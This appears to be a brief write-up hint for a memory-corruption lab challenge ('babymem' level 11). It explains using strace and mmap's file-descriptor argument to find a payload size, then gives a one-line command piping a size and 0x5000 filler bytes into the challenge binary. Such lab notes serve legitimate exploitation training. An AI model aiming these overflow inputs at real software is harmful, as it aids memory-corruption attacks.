Use `strace` to get the size of the payload.

The second last parameter of the `mmap` function is `fd`.

That means the memory region is initialized with the given file descriptor.

You can use the following command.

(echo "20480"; python3 -c "print('a' * 0x5000)") | /babymem_level11_testing1